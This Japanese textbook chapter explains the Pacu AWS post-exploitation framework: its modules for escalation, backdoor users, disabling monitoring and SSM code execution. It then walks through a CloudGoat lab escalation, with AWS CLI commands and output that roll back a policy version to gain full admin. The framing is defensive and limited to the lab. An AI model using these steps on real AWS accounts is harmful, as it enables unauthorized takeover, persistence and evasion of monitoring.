# 第8章 ツールと自動化

## PACU: AWS post-exploitationフレームワーク

### この章で学ぶこと

侵害したAWSクレデンシャル（漏洩したアクセスキー、SSRFで窃取したインスタンスメタデータの一時トークン、悪意ある依存パッケージが盗んだ環境変数など）を手にした攻撃者が、そこからどのようにして「権限の列挙 → 権限昇格 → 永続化 → 横展開 → 検知回避」というキルチェーンを自動化していくのかを、代表的なオープンソースツールである **Pacu** を題材に理解する。Pacuは侵入テスト・レッドチーム演習で広く使われている一方、同じ手口は実際のインシデントでも観測されている。本章は防御側の視点で「攻撃者が何を、なぜ、どうやってやるのか」を仕組みレベルで理解し、検知・防御に活かすことを目的とする。実在の本番AWS環境への無許可の検証は行わないこと。

### Pacuとは何か、なぜ作られたのか

Pacuは Rhino Security Labs が開発・保守しているオープンソースのAWS侵害テストフレームワークで、しばしば「**AWS版Metasploit**」と形容される。Rhino自身のブログ記事「Pacu: The Open Source AWS Exploitation Framework」では、その開発動機が明確に語られている。

> Pacuの開発は、AWS浸透試験における明確なニーズから生まれた。既存のAWSセキュリティスキャナは「コンプライアンス重視（設定がベストプラクティスに沿っているかをチェックする）」であるのに対し、Pacuは実際に「侵害後に攻撃者が何ができるか」をシミュレートする、攻撃側視点のツールを目指している。

これはMetasploitがCVEスキャナではなく実際に脆弱性を「悪用（exploit）」して次の一手を提供するのと同じ発想で、AWS環境に対して同様の役割を担わせようとしたものである。従来、大規模なAWS環境の手動列挙には数日を要していたが、Pacuによる自動化によってそれが数分〜数十分で完了するようになったという。攻撃者にとっての効率化は、同時に防御側にとっての脅威モデルの変化（列挙から侵害拡大までの時間が劇的に短縮される）を意味する。GoDaddyやUberで実際に発生したような、IAM設定ミスに起因する大規模インシデントを模擬・検証できるようにすることが開発の目的として挙げられている。

> 出典: Pacu: The Open Source AWS Exploitation Framework — https://rhinosecuritylabs.com/aws/pacu-open-source-aws-exploitation-framework/

### アーキテクチャの全体像

Pacuの設計上の特徴は次の3点に集約される（GitHubリポジトリおよびRhinoのブログより）。

1. **軽量なPython 3実装**: Python 3.7以上とpip3のみで動作し、外部の商用バックエンドに依存しない。
2. **ローカルSQLiteデータベース**: セッション情報、列挙結果（収集したIAMユーザー・ロール・ポリシー・EC2インスタンス一覧など）をローカルのSQLiteに保存し、同じ情報を求めて何度もAWS APIを呼び出すことを避ける。これは**API呼び出し回数を抑えてCloudTrailのノイズや検知トリガーを減らす**という攻撃者側の狙いも兼ねている。一度取得した情報をキャッシュ的に再利用する設計は、GuardDutyのようなAPI呼び出しパターンに基づく異常検知を回避しやすくする効果がある。
3. **モジュール式（プラグイン）構造**: 攻撃の各フェーズ（列挙・権限昇格・永続化・水平展開・データ持ち出し・証跡操作）が独立した「モジュール」として実装されており、リリース時点で35以上のモジュールが同梱されている。これはMetasploitのモジュール構造と同じ思想で、新しい攻撃手法が発見されるたびにモジュールとして追加していける拡張性を持つ。

セッションという概念も重要である。Pacuは起動時に「セッション」の作成を要求し、各セッションは独立したAWSキーペアと列挙結果のデータセットを保持する。これにより、複数の異なるエンゲージメント（案件）や、同一環境内の複数の侵害クレデンシャルを混同せずに並行して扱える。セッションの切り替えは`pacu --session <name>`で行う。

> 出典: RhinoSecurityLabs/pacu (GitHub) — https://github.com/RhinoSecurityLabs/pacu

### インストールと基本操作

GitHubのREADMEに記載されている代表的なインストール方法は以下の通りである。

```bash
# pipによる標準インストール
pip3 install -U pip
pip3 install -U pacu
pacu

# pipx（Kali Linuxで推奨されている方式）
pipx install git+https://github.com/RhinoSecurityLabs/pacu.git

# Dockerイメージを使う場合
docker run -it rhinosecuritylabs/pacu:latest
```

なぜpipxやDockerが推奨されるのかは、Pacu自体が多数のPythonパッケージ依存を持つツールであり、ホストのシステムPython環境を汚染しないよう隔離することが望ましいためである。特にDockerでの実行は、演習環境やCTF基盤など使い捨て前提の検証環境で好まれる。

起動後の基本的な対話コマンドは次の通り。

```bash
# 利用可能なモジュール一覧を表示
Pacu (session_name:No Keys Set) > list

# 侵害したAWSアクセスキーをセッションに登録
Pacu (session_name:No Keys Set) > set_keys

# 現在のクレデンシャルで叩けるAPI権限を確認（最初に必ず実行すべきモジュール）
Pacu (session_name:compromised_key) > run iam__enum_permissions

# 特定モジュールを、特定リージョンに限定して実行
Pacu (session_name:compromised_key) > run ec2__enum --regions us-east-1,ap-northeast-1

# モジュールのヘルプ（対象・前提権限・出力）を確認
Pacu (session_name:compromised_key) > help iam__privesc_scan
```

CLIから対話モードを使わずワンショットで実行する方法も用意されている。

```bash
pacu --list-modules
pacu --exec --module-name iam__enum_permissions
pacu --whoami
pacu --session compromised_key
```

`set_keys`でクレデンシャルを登録した直後にまず実行されるのが権限列挙系モジュール（`iam__enum_permissions`など）である。これは、侵害したクレデンシャルがどこまでの権限を持っているかをAPI呼び出しの試行錯誤（あるいはIAMポリシーAPIの直接取得）によって洗い出す工程で、以降のすべての攻撃判断（どの昇格経路が使えるか）の土台になる。

> 出典: RhinoSecurityLabs/pacu (GitHub) — https://github.com/RhinoSecurityLabs/pacu

### キルチェーンをカバーする代表モジュール群

Rhinoのブログ記事では、Pacuが「サイバーキルチェーン全体」をカバーするモジュール構成になっていることが強調されており、代表例として次のモジュールが挙げられている。

| モジュール名 | フェーズ | 何をするか |
|---|---|---|
| `confirm_permissions` | 列挙 | 現在のクレデンシャルが実際に保持している権限を確認する |
| `iam__privesc_scan` | 権限昇格 | IAMポリシーの誤設定を悪用し、20以上（後述の通り実装上は22種類）の権限昇格経路を自動探索・実行する |
| `cloudtrail_csv_injection` | 証跡汚染 | CloudTrailのログ出力（CSVエクスポート）に対して悪意あるフォーミュラを注入し、ログを読む担当者の端末上でコード実行を狙う（CSVインジェクション） |
| `disrupt_monitoring` | 検知回避 | GuardDuty・CloudTrail・Config・CloudWatchなど監視系サービスを無効化・停止する |
| `backdoor_users` | 永続化 | 既存のIAMユーザーに対し、攻撃者が把握しているアクセスキーを追加で発行し、正規ユーザーのなりすましとして継続的にアクセスできるようにする |
| `sysman_ec2_rce` | 横展開/実行 | AWS Systems Manager（SSM）の`SendCommand`権限を悪用し、エージェントが動いているEC2インスタンス上でリモートコード実行を行う（SSHやRDPのポート開放が不要） |
| `backdoor_ec2_sec_groups` | 永続化 | セキュリティグループに攻撃者のIPからのインバウンドを許可するルールをこっそり追加し、後日直接アクセスできるようにする |

これらのモジュール名から分かる設計思想は、「一つ一つの攻撃ステップを独立した小さな自動化スクリプトに分解し、対話シェルの中でパイプラインのようにつなげて実行できるようにする」というものである。防御側の視点で重要なのは、これらは特別な0-dayではなく、**すべて正規のAWS API呼び出しの組み合わせ**であるという点である。つまりWAFやIDS/IPSのようなシグネチャベースの防御では検知できず、CloudTrailのAPIコールパターンや、IAMポリシーの最小権限原則の遵守状況そのものが防御の要になる。

Rhinoのデモ（OWASP Seattleでの発表）では、侵害されたAWSキー1つを起点に「権限列挙 → privesc_scanによる権限昇格 → 永続化（バックドアユーザー作成） → sysman_ec2_rceによるEC2上のリモートコード実行」という一連の流れを数分で実演したことが紹介されている。これは手動なら数日かかる作業がツールによって圧縮された典型例であり、**インシデント対応側も同程度のスピードで検知・遮断できる体制**が求められることを示唆している。

> 出典: Pacu: The Open Source AWS Exploitation Framework — https://rhinosecuritylabs.com/aws/pacu-open-source-aws-exploitation-framework/

### 中核モジュール `iam__privesc_scan` の仕組み

Pacuの中でも特に有名で、実際の脅威モデルとして重要なのが `iam__privesc_scan` である。GitHub上の実装（`pacu/modules/iam__privesc_scan/main.py`）や関連issueの情報を総合すると、このモジュールは次のように動作する。

1. **候補となるIAMアイデンティティ（ユーザー/ロール）にアタッチされているポリシーをすべて取得する。**
2. **各ポリシーのAllowされたアクションを、既知の「権限昇格パターン」のリストと突き合わせる。** Pacuの実装では22種類の権限昇格手法（escalation method）がハードコードされている。
3. **昇格が可能と判定された場合、実際にそのAPIを呼び出して権限昇格を試行する（`--offline`オプションを付けなければ実際に実行される）。**

代表的な昇格パターンをいくつか挙げる。いずれも「本来は管理用途で必要とされることがあるが、対象を限定せずに付与すると即座に権限昇格経路になる」IAMアクションである。

- **`iam:AttachGroupPolicy` / `iam:AttachUserPolicy` / `iam:AttachRolePolicy`**: 自分が所属するグループ、あるいは自分自身のユーザー/ロールに対して`AdministratorAccess`のようなマネージドポリシーを直接アタッチできてしまう。最も単純で気づかれにくい昇格経路の一つ。
- **`iam:PutUserPolicy` / `iam:PutRolePolicy`**: 対象を指定した「インラインポリシー」を、既存のユーザーやロールに追加できる権限。ポリシードキュメントの中身は呼び出し側が自由に書けるため、`"Action": "*", "Resource": "*"`のような全許可ポリシーを差し込めば実質的に管理者権限を得られる。
- **`iam:CreatePolicyVersion`**: 既存のカスタマー管理ポリシーに新しいバージョンを追加できる権限。IAMのポリシーバージョンは最大5世代保持され、`SetAsDefault`で新バージョンを既定にできるため、既存の（無害な）ポリシーの中身を全許可に書き換えることができる。
- **`iam:SetDefaultPolicyVersion`**: 既に存在する古いポリシーバージョンの中に緩い権限を持つものがあれば、それを既定バージョンとして戻すだけで昇格できる（新規のポリシー変更操作を必要としないぶん、より検知されにくい）。

なぜこれらが危険なのかは、IAMの評価モデルの仕組みに根ざしている。IAMは「ポリシーにアタッチされたAllow文の集合」でアクセスを許可判定するため、**「誰が」ポリシーの中身を書き換えられるか（＝IAMそのものを管理する権限）は、実質的に「何でもできる」権限と等価になる**。最小権限の原則が「実行するアクション」だけでなく「IAM自体を変更する権限」にも及んでいなければ、権限昇格の入口はいくらでも生まれてしまう。これがPacuの`iam__privesc_scan`が体系的に自動探索しようとしている脆弱性のクラスである。

防御側としては、`iam:*Policy*`系のAPI、特に`PutUserPolicy`・`PutRolePolicy`・`AttachUserPolicy`・`CreatePolicyVersion`・`PassRole`（他のロールをLambdaやEC2に引き渡して実行させる）のCloudTrailログを重点的に監視し、日常的に使われないIAMプリンシパルからのこれらの呼び出しをアラート対象にすることが有効な検知ポイントになる。

> 出典: RhinoSecurityLabs/pacu (GitHub) — https://github.com/RhinoSecurityLabs/pacu

### Pacu Wikiについて（取得状況の注記）

> ⚠️ **未取得の資料**: 「PACU Wiki」（https://github.com/rhinosecuritylabs/pacu/wiki ）は、ページ本体の大部分が動的読み込み要素で構成されており、自動取得ツールでは実質的な技術内容（インストール手順の全文、CLIコマンド一覧、各モジュールの個別説明ページ、セッションログのフォーマット詳細など）を取得できませんでした。以下のURLからご自身で直接ご覧ください: https://github.com/rhinosecuritylabs/pacu/wiki

（以下は未取得資料の補足として一般知識に基づく解説です）Pacu Wikiは通常、次のような構成を取っている。

- **Installation**: OS別（macOS/Linux、Kali Linuxでの`pipx`推奨手順など）のインストールガイドとトラブルシューティング。
- **Quickstart Guide**: 初回セッション作成からモジュール実行までをスクリーンショット付きで解説する入門ページ。
- **User Guide**: セッション管理、`data`コマンドによる収集済みデータの閲覧、`services`コマンドでの利用可能サービス確認など、対話シェルの応用的な使い方。
- **Module Details**: 同梱される全モジュールの一覧と、それぞれの前提権限・出力・対象サービスをまとめた表。
- **Session Logs**: 実行したコマンドとAPI呼び出しのログがどこに（デフォルトでは`~/.local/share/pacu/<session_name>/`配下、バージョンによって異なる）保存されるかの説明。
- **Module Development Guide**: 新しいモジュールを追加する際のディレクトリ構成（`main.py`にモジュール本体、`ARGUMENTS_LIST`でCLI引数を定義するなど）や、Pacuのコアが提供するヘルパー関数（ページネーション付きAPI呼び出しのラッパーなど）の使い方。

これらの構成はPacuがMetasploitに範を取ったモジュール開発フレームワークであることを裏付けている。実際の内容を参照する際は、必ず公式Wikiページ本体を直接開いて確認すること。

### 防御的な観点からのまとめ

Pacuのようなpost-exploitationフレームワークが示している脅威モデルは、「AWSクレデンシャルの漏洩＝即座に環境全体の制御を奪われる」という単純化しすぎた話ではなく、**「クレデンシャル漏洩後、IAM設定の緩さの程度に応じて、数分〜数十分で権限昇格・永続化・検知回避まで到達しうる」**という、より実践的な時間軸の脅威である。防御側が取るべき対策は次の3点に集約できる。

1. **最小権限の徹底**: 特に`iam:Put*Policy`・`iam:Attach*Policy`・`iam:CreatePolicyVersion`・`iam:PassRole`のような「権限そのものを変更できる」アクションは、必要なプリンシパルに限定し、ワイルドカードでの付与を避ける。
2. **CloudTrailの常時監視とアラート**: IAMポリシー変更系API、`GuardDuty`/`Config`/`CloudWatch`の無効化操作、`ssm:SendCommand`の異常な実行など、Pacuの代表モジュールが叩くAPI群をSIEM側で重点監視する。
3. **異常検知の自動化**: 手動対応では攻撃者の自動化速度に追いつけないため、GuardDutyやSecurity Hub、あるいは独自のCloudTrailベースの相関ルールによって、モジュール実行に対応するAPI呼び出しパターン（短時間での列挙→権限変更→バックドア作成という連鎖）を検知できる仕組みを整えることが望ましい。

Pacu自体はBSD-3-Clauseライセンスで公開されており、READMEには「AWSの許容利用ポリシーに準拠するよう設計されている」旨の記載があるが、実際の利用にあたっては対象環境の所有者からの明示的な許可（および、必要に応じてAWSのペネトレーションテストポリシーの確認）が前提となる。ツール自体には一切の保証がなく、利用結果の責任はすべて利用者に帰することが明記されている。本教科書で紹介した内容も、自組織が管理する検証環境や許可されたレッドチーム演習の範囲でのみ実践すること。

## PACUによるIAM列挙・PrivEscスキャンのチュートリアル

前節までで「クラウド攻撃者が何を狙うか」を学んだ。本節では、その代表的な攻撃フレームワークである **Pacu**（パキュー、Rhino Security Labs製のAWS特化型ペネトレーションテストツール）を使って、実際にIAM権限を列挙し、権限昇格（PrivEsc: Privilege Escalation、低権限のIAMアイデンティティが本来許可されていないはずの高権限操作に到達すること）経路を発見するまでの一連の流れを、コマンドと出力の実例で追う。演習環境には **CloudGoat**（Rhino Security Labsが提供する「意図的に脆弱なAWS環境」構築ツール）を用いる。

本節は防御的教育目的であり、実施はすべて自分で作成したCloudGoat環境やIAMサンドボックスなど、権限を持つ検証環境に限定すること。実在の第三者アカウント・本番環境に対してこれらの手順を無許可で行うことは、AWSの利用規約および各国の不正アクセス関連法に抵触する。

### Pacuとは何か、そしてなぜ列挙が起点になるのか

Pacuは「AWS攻撃的セキュリティフレームワーク」であり、**モジュール**（列挙・攻撃・持続化などの機能を担う個別のPythonスクリプト）と、**永続的なセッション**（収集した認証情報・列挙結果をローカルのSQLiteデータベースに保存する作業単位）を中心に設計されている。よく比較されるProwlerなどの設定監査ツールが「このAWSアカウントの設定はベストプラクティスに沿っているか」を問うのに対し、Pacuは「いま手元にあるこの認証情報で、実際に何ができるか」という攻撃者視点の問いに答えることに特化している。この違いは重要で、IAMポリシーは複雑に組み合わさるため、ポリシードキュメントを目で読むだけでは実効権限を正確に把握できないことが多い。Pacuは対象の認証情報でAWS APIを実際に叩き、成功したAPI呼び出しの結果を積み上げることで「確認された権限（Confirmed Permissions）」を構築していく。

> 出典: Pwned Labs「Beginner's Guide: AWS IAM Privilege Escalation with Pacu」— https://pwnedlabs.io/blog/beginners-guide-to-hunting-for-aws-iam-privilege-escalations-with-pacu

### インストールとセッションの作成

現在推奨されるインストール方法は、GitHubリポジトリから `pipx`（Pythonアプリケーションを隔離環境にインストールするツール）を使う方式である。

```bash
pipx install git+https://github.com/RhinoSecurityLabs/pacu.git
pacu --version
# 出力例: Pacu 1.7.0
```

この手順はPacu 1.7.0、Python 3.13.12、AWS CLI 2.36.17の組み合わせで検証されている。バージョンが異なると出力フォーマットやモジュール引数が変わることがあるため、実施前に `pacu --help` や各モジュールの `--module-info` で最新仕様を確認する習慣が必要である（ツールは活発に更新されるため、本節のコマンド例が将来のバージョンでそのまま動く保証はない）。インストール後、ローカルの列挙結果やセッションデータは `~/.local/share/pacu/` 以下のSQLiteデータベースに保存される。これは裏を返せば、Pacuを実行したホスト自体に機微な列挙結果（IAMユーザー名、ARN、確認された権限一覧など）が平文に近い形で残るということであり、検証後にホストを適切に破棄・クリーニングする運用が望ましい。

セッションは案件（エンゲージメント）ごとに分離して作成する。これにより異なる対象の認証情報や列挙結果が混在しない。

```bash
# セッションの新規作成
pacu --new-session glc-pacu-cg-rollback
# 出力: Session glc-pacu-cg-rollback created.

# セッションの有効化
pacu --session glc-pacu-cg-rollback --activate-session

# 認証情報のインポート（ローカルのAWS CLIプロファイル "raynor" から取り込む例）
pacu --session glc-pacu-cg-rollback --import-keys raynor
# 出力: Imported keys as "imported-raynor"

# 対象リージョンの設定
pacu --session glc-pacu-cg-rollback --set-regions us-east-1
# 出力: Session regions changed: ['us-east-1']
```

`--import-keys` はローカルの `~/.aws/credentials` に設定済みのプロファイル名を指定してPacuに取り込む方式で、STSの一時トークン（AssumeRoleなどで発行されるアクセスキー・シークレットキー・セッショントークンの組）を使う場合はトークンも欠かさずインポートする必要がある。トークンを忘れると、後続のAPI呼び出しが認証エラーで失敗し、列挙結果が正しく取得できない典型的なトラブルとなる。

> 出典: GoLinuxCloud「Pacu AWS Tutorial: IAM Enumeration, PrivEsc Scan & CloudGoat」— https://www.golinuxcloud.com/pacu-aws-exploitation/

### 演習シナリオ: CloudGoatの iam_privesc_by_rollback

GoLinuxCloudの記事では、CloudGoatが提供する `iam_privesc_by_rollback` シナリオを使って一連の流れを実演している。このシナリオを選ぶ理由は、IAMのみに焦点を絞った小規模構成でありながら、「たった1つのIAMアクション（ポリシーバージョンの切り替え）だけで実効アクセスが劇的に変化する」という権限昇格の本質を、余計な要素なく明確に説明できる点にある。

```bash
cloudgoat create iam_privesc_by_rollback --profile default
```

このシナリオが作るIAMユーザー（例: `raynor-cgidXXXXXXXX`）には、カスタマー管理ポリシーの**5つのバージョン**が用意される。**デフォルトのバージョン**（AWSでは1つのIAMポリシーに対して最大5世代までバージョン履歴を保持でき、そのうち1つが「デフォルト」として実効適用される仕組みになっている）は「IAMの読み取り系（Get/List）権限」と「`iam:SetDefaultPolicyVersion`」のみを許可する。ところが**古いバージョン**の中には、`"Action": "*", "Resource": "*"` というフル管理者権限を許可する内容がそのまま削除されずに残っている。つまり、ユーザー自身には強い権限がなくても、「過去に付与されていた強い権限のスナップショット」を呼び戻す権利だけは与えられている、という設計ミスがここでの脆弱性の核心である。

#### なぜこれが成立するのか(仕組みレベルの説明)

IAMのカスタマー管理ポリシーは、S3のオブジェクトバージョニングに似た仕組みでバージョン管理される。`PutPolicy`相当の更新のたびに新しいバージョン（v1, v2, v3…）が作成され、そのうち1つが `IsDefaultVersion: true` としてマークされ、実際にプリンシパル（IAMユーザーやロール)に対して評価されるのはこの「デフォルトバージョン」のドキュメントだけである。`iam:SetDefaultPolicyVersion` アクションは、既存のバージョンの中からどれをデフォルトにするかを切り替える権限であり、新しいポリシーを作成する権限（`iam:CreatePolicyVersion`）とは別物である。したがって「ポリシーの新規作成・変更はできないが、既存バージョンの切り替えだけはできる」という一見無害に見える権限を持つユーザーが、過去に存在した高権限バージョンへロールバックするだけで、実質的に管理者権限を手にできてしまう。これがPacuの `iam__privesc_scan` モジュールが `SetExistingDefaultPolicyVersion` という名称で検知する昇格経路であり、AWS IAMの「バージョン履歴を明示的に削除しない限り残り続ける」という仕様と、「デフォルトバージョンの切り替えという一見軽微に見える操作を許可してしまう」ポリシー設計ミスが組み合わさって生まれる典型的なPrivEscパターンである。

### IAM列挙モジュールの実行

まずアカウント全体の基本情報を列挙する。

```bash
pacu --session glc-pacu-cg-rollback --module-name aws__enum_account --exec
```

```
[aws__enum_account] Enumerating Account: <No IAM Alias defined>
Account Information:
    Account ID: 111122223333
    Key Arn: arn:aws:iam::111122223333:user/raynor-cgidXXXXXXXX
```

これはAWS CLIの `aws sts get-caller-identity --profile raynor` と同等の情報をPacuのデータストアに保存する操作であり、以降のモジュールがこの情報を再利用する。

利用可能なモジュール一覧は次で確認できる。

```bash
pacu --list-modules
```

出力には機能カテゴリ別の分類が表示され、**ESCALATE**（権限昇格系。`cfn__resource_injection`、`iam__privesc_scan` など）と**ENUM**（列挙系。`aws__enum_account`、`iam__enum_permissions`、`iam__enum_users`など）に大別される。列挙(ENUM)を先に行い、その結果を使って昇格(ESCALATE)候補を探す、という二段階の流れがPacuの基本設計思想である。

次に、現在の認証情報が実際に何を許可されているかを確認する `iam__enum_permissions` を実行する。

```bash
pacu --session glc-pacu-cg-rollback --module-name iam__enum_permissions --exec
```

```
[iam__enum_permissions] Confirming permissions for users:
[iam__enum_permissions]   raynor-cgidXXXXXXXX...
[iam__enum_permissions]     Confirmed Permissions for raynor-cgidXXXXXXXX

  66 Confirmed permissions for user: raynor-cgidXXXXXXXX.
   0 Unconfirmed permissions for 0 user(s).
```

このモジュールは、対象ユーザーにアタッチされたインラインポリシー・管理ポリシーをIAM API経由で取得し、それらのステートメントを解析して「実際に許可されているアクションの集合」を組み立てる。ここで重要なのは「Confirmed（確認済み）」と「Unconfirmed（未確認）」の区別である。対象ユーザー自身がIAMポリシーを読み取る権限を持たない場合、Pacuはポリシー内容を直接取得できず、代わりに個々のAPIを実際に試行して成否から権限の有無を推測する「ブルートフォース的確認」に頼らざるを得ない。この場合は権限一覧が不完全になりうるため、レポートには「未確認」の状態であることを明記し、過信しないことが実務上重要である。

続いて `whoami` で、確認済み権限の詳細をJSON形式で確認する。

```bash
pacu --session glc-pacu-cg-rollback --whoami
```

```json
{
  "UserName": "raynor-cgidXXXXXXXX",
  "Arn": "arn:aws:iam::111122223333:user/raynor-cgidXXXXXXXX",
  "AccountId": "111122223333",
  "KeyAlias": "imported-raynor",
  "PermissionsConfirmed": true,
  "Permissions": {
    "Allow": {
      "iam:listpolicyversions": { "Resources": ["*"] },
      "iam:getpolicyversion": { "Resources": ["*"] },
      "iam:setdefaultpolicyversion": { "Resources": ["*"] }
    },
    "Deny": {}
  }
}
```

`PermissionsConfirmed: true` は、Pacuがこのアイデンティティに付随するIAMポリシードキュメントを直接読み取り、静的解析によって権限セットを構築できたことを意味する。ただし、この判定はSCP（Service Control Policy、AWS Organizations配下のアカウントに組織全体で強制される追加の制約）や、リソースベースポリシー、IAM Condition句（時刻・IPアドレス・MFA有無などによる実行時条件）を考慮していない点に注意が必要である。つまり「Pacuが許可されていると判定した=実行時に必ず成功する」ではなく、あくまで「ポリシードキュメント上は許可に見える」という静的な結果であり、最終的な検証は実際のAPI呼び出し（後述のAWS CLI検証）で行う必要がある。

> 出典: GoLinuxCloud「Pacu AWS Tutorial: IAM Enumeration, PrivEsc Scan & CloudGoat」— https://www.golinuxcloud.com/pacu-aws-exploitation/

### iam__privesc_scanモジュールによる昇格経路の発見

列挙結果をもとに、権限昇格の可能性を体系的にチェックするのが `iam__privesc_scan` モジュールである。このモジュールは、AWS IAMで知られている数十種類の権限昇格パターン（例: `iam:PutUserPolicy` による自己へのポリシー付与、`iam:AttachUserPolicy` による管理ポリシーの直接アタッチ、`iam:CreatePolicyVersion` による既存ポリシーの上書き、そして本シナリオの `iam:SetDefaultPolicyVersion` によるロールバックなど）と、対象アイデンティティの確認済み権限を突き合わせ、一致するパターンを報告する。

実務での利用では、対象環境に実際に変更を加えず調査だけを行う **`--scan-only`** フラグの使用が強く推奨される。これを付けない場合、Pacuは検出した昇格経路を実際に「実行」しようとする動作をとりうるため、許可されたペネトレーションテストのルール・オブ・エンゲージメント（RoE、テスト実施範囲や許可される操作を定めた合意事項）を超えた変更を対象環境に加えてしまうリスクがある。教育・検証目的であっても、まず `--scan-only` で「何が可能か」を把握し、実際に権限昇格を実演する場合も自分の管理下にあるサンドボックス環境に限定すべきである。

```bash
pacu --session glc-pacu-cg-rollback --module-name iam__privesc_scan \
  --module-args='--scan-only' --exec
```

```
[iam__privesc_scan] Escalation methods for current user:
[iam__privesc_scan]   CONFIRMED: SetExistingDefaultPolicyVersion

[iam__privesc_scan] MODULE SUMMARY:
  Scan Complete
```

`CONFIRMED` という表示は、Pacuが単に理論上の可能性を示しているのではなく、必要な権限が実際に確認済み権限セットの中に存在すると判定したことを意味する（対する `POTENTIAL` は、権限が「未確認」カテゴリに含まれており実際に試すまで確証が持てない場合に使われる区分である）。

モジュールの詳細説明は次で取得できる。

```bash
pacu --module-name iam__privesc_scan --module-info
```

この出力には次のような重要な注意書きが含まれる。

> 「このモジュールはNotActionsの解析に難しさを抱えています。ユーザーがNotActionsを持つ場合は、モジュール結果の手動検証を推奨します。」

**NotAction**（IAMポリシーで「列挙したアクション以外の全アクションを対象にする」という否定形の指定方法）を含むポリシーは、`Action` による肯定形の列挙とは評価ロジックが大きく異なり、単純なパターンマッチでは正確に解析しきれない。`whoami` の出力でNotActionに由来する権限は先頭に `!` が付与されて表示されるため、これが見えた場合はPacuの判定を鵜呑みにせず、必ずAWS CLIなど実際のAPI呼び出しで裏取りする必要がある。この注意は、自動化ツール全般に共通する重要な教訓でもある。ツールが提示する「昇格候補」はあくまで仮説であり、最終的な確証は実際の環境での検証によってのみ得られる。

> 出典: GoLinuxCloud「Pacu AWS Tutorial: IAM Enumeration, PrivEsc Scan & CloudGoat」— https://www.golinuxcloud.com/pacu-aws-exploitation/

### 発見した経路の検証(AWS CLIによる裏取り)

Pacuが提示した「デフォルトポリシーバージョンのロールバック」という仮説を、AWS CLIで一つずつ裏取りする。この段階を踏むことで、レポートに「実際に確認された事実」として記載できる証跡が揃う。

まず、対象ユーザーにアタッチされているカスタマー管理ポリシーを確認する。

```bash
aws iam list-attached-user-policies --user-name raynor-cgidXXXXXXXX \
  --profile raynor
```

```json
{
    "AttachedPolicies": [
        {
            "PolicyName": "cg-raynor-policy-cgidXXXXXXXX",
            "PolicyArn": "arn:aws:iam::111122223333:policy/cg-raynor-policy-cgidXXXXXXXX"
        }
    ]
}
```

そのポリシーのバージョン履歴を一覧する。

```bash
aws iam list-policy-versions \
  --policy-arn arn:aws:iam::111122223333:policy/cg-raynor-policy-cgidXXXXXXXX \
  --profile raynor
```

```json
{
    "Versions": [
        {"VersionId": "v5", "IsDefaultVersion": false},
        {"VersionId": "v4", "IsDefaultVersion": false},
        {"VersionId": "v3", "IsDefaultVersion": false},
        {"VersionId": "v2", "IsDefaultVersion": false},
        {"VersionId": "v1", "IsDefaultVersion": true}
    ]
}
```

非デフォルトのバージョン(例としてv3)の中身を見て、実際にフル管理者権限が含まれているかを確認する。

```bash
aws iam get-policy-version \
  --policy-arn arn:aws:iam::111122223333:policy/cg-raynor-policy-cgidXXXXXXXX \
  --version-id v3 --profile raynor
```

```json
{
    "PolicyVersion": {
        "Document": {
            "Version": "2012-10-17",
            "Statement": [{
                "Action": "*",
                "Effect": "Allow",
                "Resource": "*"
            }]
        },
        "VersionId": "v3",
        "IsDefaultVersion": false
    }
}
```

想定どおり、v3は `"Action": "*", "Resource": "*"` という無制限の管理者権限を許可する内容であることが確認できた。

昇格前の状態として、現在のデフォルトバージョン(v1)では権限が不足していることを確認しておく(この段階を踏むことで「昇格の前後」の対比がレポート上で明確になる)。

```bash
aws s3 ls --profile raynor
# エラー出力: AccessDenied: User is not authorized to perform: s3:ListAllMyBuckets
```

ここで、検証環境の管理者として許可した範囲内で、デフォルトバージョンをv3へ切り替える。

```bash
aws iam set-default-policy-version \
  --policy-arn arn:aws:iam::111122223333:policy/cg-raynor-policy-cgidXXXXXXXX \
  --version-id v3 --profile raynor
```

このコマンドは成功時に出力を返さない(HTTP 200のみ)。切り替えが反映されたことを確認する。

```bash
aws iam get-policy \
  --policy-arn arn:aws:iam::111122223333:policy/cg-raynor-policy-cgidXXXXXXXX \
  --profile raynor --query 'Policy.DefaultVersionId' --output text
# 出力: v3
```

最後に、管理者権限を得たことの最小限の実証として、IAMユーザーの作成・削除を行う(検証用の使い捨てリソースであり、確認後すぐに削除して環境をクリーンな状態に戻す)。

```bash
aws iam create-user --user-name glc-pacu-proof-admin --profile raynor
```

```json
{
    "User": {
        "UserName": "glc-pacu-proof-admin",
        "Arn": "arn:aws:iam::111122223333:user/glc-pacu-proof-admin"
    }
}
```

```bash
aws iam delete-user --user-name glc-pacu-proof-admin --profile raynor
```

権限昇格後にPacuで再度 `iam__enum_permissions` を実行すると、確認された権限の数が **66件からおよそ15,319件へと激増**し、`*:*` (全アクション・全リソース許可)と一致する内容になる。この件数の劇的な変化そのものが、レポートにおける説得力のある「Before/After」の証拠となる。

> 出典: GoLinuxCloud「Pacu AWS Tutorial: IAM Enumeration, PrivEsc Scan & CloudGoat」— https://www.golinuxcloud.com/pacu-aws-exploitation/

### もう一つの典型パターン: iam:Put* によるインラインポリシーの自己付与

Pwned Labsの記事では、SetDefaultPolicyVersionとは異なるもう一つの代表的な昇格パターンが紹介されている。対象ユーザーに次のような権限が付与されているケースである。

```json
"Action": [
  "iam:Get*",
  "iam:List*",
  "iam:Put*",
  "iam:SimulateCustomPolicy",
  "iam:SimulatePrincipalPolicy"
]
```

ここで核心となるのは `iam:Put*` である。この権限には `iam:PutUserPolicy`(指定したIAMユーザーにインラインポリシーを直接追加するAPI)が含まれる。IAMユーザーが自分自身に対してこのAPIを呼び出せる場合、そのユーザーは自分自身に「フル管理者権限を許可するインラインポリシー」を追加でき、即座に管理者相当のアクセスへ昇格できてしまう。これは前述のバージョンロールバック型とは異なり、「新しい高権限ポリシーをその場で作成して自分にアタッチする」という直接的な自己昇格パターンであり、IAM関連の権限昇格の中でも最も基本的かつ発生頻度の高い類型の一つである。

Pwned Labsの記事で示されたPacuでの検出・実演フローは次のとおりである(手順の骨格)。

```
set_keys                      # 対象ユーザーの認証情報をPacuにセット
whoami                        # 現在のユーザーと権限を確認
run iam__enum_permissions     # 権限列挙
run iam__privesc_scan         # 昇格ベクトルのスキャン
```

